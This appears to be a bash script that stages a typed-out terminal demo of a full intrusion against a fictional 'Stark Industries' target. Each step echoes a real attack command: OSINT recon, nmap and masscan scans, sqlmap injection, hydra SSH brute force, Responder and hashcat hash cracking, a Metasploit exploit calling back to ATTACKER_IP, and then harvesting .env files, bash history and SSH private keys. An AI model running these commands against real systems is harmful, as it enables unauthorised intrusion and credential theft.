...
# Target environment
TARGET_CORP="Stark Industries"
TARGET_DOMAIN="stark.corp"
...
type_text_clean() {
    local text="$1"
    local chars_per_key="${2:-3}"

    local processed
    processed=$(echo -e "$text")
    ...
    trap 'stty -F /dev/tty echo icanon; exec 3<&-; echo' EXIT
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/recon${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} theHarvester -d ${TARGET_DOMAIN} -b all -l 500 -f ${OP_ID}_emails"
sleep 0.3
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/recon${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} subfinder -d ${TARGET_DOMAIN} -o subdomains.txt && cat subdomains.txt"
sleep 0.3
spinner_anim "Enumerating subdomains using passive DNS" 2
echo ""
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/recon${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} shodan search 'org:\"${TARGET_CORP}\"' --fields ip_str,port,product,version"
sleep 0.3
spinner_anim "Querying Shodan database for exposed services" 2
echo ""
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/recon${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} curl -s 'https://crt.sh/?q=%.${TARGET_DOMAIN}&output=json' | jq -r '.[].name_value' | sort -u"
sleep 0.3
spinner_anim "Analyzing SSL certificate transparency logs" 1
echo ""
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/scan${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} masscan ${INTERNAL_NET} -p1-65535 --rate=10000 --open-only"
sleep 0.3
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/scan${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} nmap -sV -sC -O -A --script=vuln -p- ${TARGET_IP} -oA ${OP_ID}_nmap"
sleep 0.3
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/scan${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u https://${TARGET_IP}/FUZZ -mc 200,301,302,403 -t 200"
sleep 0.3
...
##sleep 0.4
#
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/vuln${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} nikto -h https://${TARGET_IP} -ssl -Format txt -output nikto_${OP_ID}.txt"
sleep 0.3
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/vuln${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} sqlmap -u \"https://${TARGET_IP}/api/users?id=1\" --batch --random-agent --level=5 --risk=3 --threads=10"
sleep 0.3
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/vuln${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} searchsploit nginx 1.18 php 7.4 linux"
sleep 0.3
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/creds${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ${TARGET_IP} ssh -t 4 -V"
sleep 0.3
...
echo -e "${G}[22][ssh]${NC} host: ${W}${TARGET_IP}${NC}   login: ${C}admin${NC}   password: ${R}SummerOf69!${NC}"
sleep 0.6

echo ""
echo -e "${G}[+]${NC} ${W}${BOLD}VALID CREDENTIALS FOUND${NC}"
echo -e "${GR}    Username: ${C}admin${NC}"
echo -e "${GR}    Password: ${R}SummerOf69!${NC}"
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/creds${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} python3 responder.py -I eth0 -wrf -v"
sleep 0.3
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/creds${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} hashcat -m 5600 -a 0 ntlmv2_hashes.txt rockyou.txt --force --opencl-device-types 1,2"
sleep 0.3
...
echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/exploit${GR}]${NC}"
echo -ne "${GR}└─${R}\$${NC}"
type_text_clean "${NC} msfconsole -q -x \"use exploit/multi/http/php_cgi_arg_injection; set RHOSTS ${TARGET_IP}; set LHOST ${ATTACKER_IP}; exploit\""
sleep 0.6
echo ""
...
echo -ne "${R}meterpreter >${NC}"
type_text_clean "${DIM}sysinfo${NC}"
sleep 0.3
...
echo ""
echo -ne "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC}"
type_text_clean "${DIM}cat /var/www/html/.env${NC}"
sleep 0.3
...
type_text_clean "${DIM}whoami && id${NC}"
sleep 0.3
echo "root"
...
echo ""
echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
type_text_clean "${DIM}cat ~/.bash_history | grep -iE 'ssh|password|mysql|sudo'${NC}"
sleep 0.3
...
echo ""
echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
type_text_clean "${DIM}find /home -type f -name '*.txt' -o -name '*.conf' -o -name 'id_rsa' 2>/dev/null | head -8${NC}"
sleep 0.4
...
echo "b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABC6qaBfHT"
echo "HmQuxY3Bas6CrnAAAAEAAAAAEAAAEVAAAAB3NzaC1yc2EAAAABIwAAAQEAvsfgBxrRrXtT"
echo "K6NlFboYvw/1t+BWn27OuykQzGkChEFch4ai8r9aHBtRSPx65cSvlgTMKhbBuyApZTan9J"
echo "P3mukwzyryZWupGnR3cXyapJTFoPlk3McLPeBTzZdv5cqIobEKyyqZNPztubpGPQ9CH//h"
echo "rYGh6rxHX35HoBcKTGao8mniXdC9mjDXxL6ZlOchlIx+QLgk8IZqLPHVlFD7ZY1NS4h+7c"
echo "xKDTlvci+5ylA2uYxS8tF8AQu3n8y7pensbwFWZYjhxpq+4Ft3ZTctcwVbt2Ld/ne5uMET"
echo "jrswejJney8pIPQz59FrEriHqdvJyFslbP0MGsA6cKLow7tKaQAAA8C4x8brtTC618rLBT"
echo "bh4pg8uUEZcXC/XxR5lCOXWpm4lREvkNzIIZx4zODnHwi+ufIk6Ul41pAizmgkSMwVW0UO"
echo "hNMAVGgrV/wV866XC4RvBQkb5magBWjjOkmpwf3t3+/iI+7BfxAlsGK3rHLT7/rZ04km2V"
echo "DpGlK9STAEs7NlJ4AQxQAcXqFOzFxkZ0Rba5aqKzVy28WIFgFnwl1xkHYqR61xSTn6UCVy"
echo "JAdhftais5YGuPjQXcSyIxjgGl1vxCdAqzjSyNTsy+ztjE5522Bdn+plk1Hw2Ik7g56rNX"
echo "fpm9JNt1XgARV8xHenOW22zmXdJE6klNXQ17pfka+pod+8sxekH0K6MqlEfPXoHG/CfksW"
echo "RCffqd2oYni4WIRrwL8HQTyvNwMSJGNC6zV7scIJNsQk/LAQCK0k2TI24fAKq72nKiCLeK"
echo "UaKSyIpY+UBOJah6Oro9UGxCwZny/E+YNUwPz0ys8UwN0SPz+Jgq/ZJUE0099LhWzRzfjy"
